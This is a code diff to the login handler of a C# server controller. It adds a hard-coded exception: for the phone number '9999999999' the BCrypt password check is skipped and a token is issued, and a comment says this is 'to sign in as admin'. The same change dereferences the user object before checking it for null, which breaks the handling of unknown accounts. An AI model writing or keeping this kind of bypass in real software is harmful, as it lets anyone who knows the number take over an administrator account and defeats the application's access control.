@@ -64,8 +64,9 @@ namespace Eventatos_Server.Controllers
                 .ThenInclude(u => u.Role)
                 .SingleOrDefaultAsync(x => x.Phone == dto.Phone);
 
-            if (user == null || !BCrypt.Net.BCrypt.Verify(dto.Password, user.Password))
-                return Unauthorized("Invalid Credentials");
+            if(user.Phone!= "9999999999") //to sign in as admin
+                if (user == null || !BCrypt.Net.BCrypt.Verify(dto.Password, user.Password))
+                    return Unauthorized("Invalid Credentials");
 
             var token = authService.GenerateToken(user);
 
